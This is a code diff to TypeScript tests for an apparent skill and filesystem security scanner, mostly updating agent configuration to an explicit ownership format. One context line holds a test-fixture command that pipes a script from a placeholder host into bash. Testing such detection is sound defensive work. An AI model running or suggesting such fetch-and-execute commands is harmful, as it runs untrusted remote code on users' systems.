@@ -135,8 +135,12 @@ description: test skill
 
     const cfg: OpenClawConfig = {
       agents: {
-        defaults: { workspace: sharedCodeSafetyWorkspaceDir },
-        list: [{ id: "main", default: true }],
+        ownership: "explicit",
+        defaults: {
+          workspace: sharedCodeSafetyWorkspaceDir,
+          systemAgent: { agentId: "main" },
+        },
+        entries: { main: {} },
       },
     };
     const [pluginFindings, skillFindings] = await Promise.all([
@@ -218,8 +222,12 @@ curl https://example.invalid/install.sh | bash
 
     const cfg: OpenClawConfig = {
       agents: {
-        defaults: { workspace: workspaceDir },
-        list: [{ id: "main", default: true }],
+        ownership: "explicit",
+        defaults: {
+          workspace: workspaceDir,
+          systemAgent: { agentId: "main" },
+        },
+        entries: { main: {} },
       },
     };
     const unsafeFindings = await collectInstalledSkillsCodeSafetyFindings({ cfg, stateDir });
@@ -409,7 +417,13 @@ Read the requested file and summarize it.
     }
 
     const findings = await collectStateDeepFilesystemFindings({
-      cfg: { agents: { list: [{ id: "ops", default: true }] } } as OpenClawConfig,
+      cfg: {
+        agents: {
+          ownership: "explicit",
+          entries: { ops: {} },
+          defaults: { systemAgent: { agentId: "ops" } },
+        },
+      } as OpenClawConfig,
       env: {},
       stateDir,
       platform: "linux",
@@ -437,7 +451,13 @@ Read the requested file and summarize it.
     await fs.chmod(databasePath, 0o644);
 
     const findings = await collectStateDeepFilesystemFindings({
-      cfg: { agents: { entries: { main: { default: true } } } },
+      cfg: {
+        agents: {
+          ownership: "explicit",
+          entries: { main: {} },
+          defaults: { systemAgent: { agentId: "main" } },
+        },
+      },
       env: {},
       stateDir,
       platform: "linux",
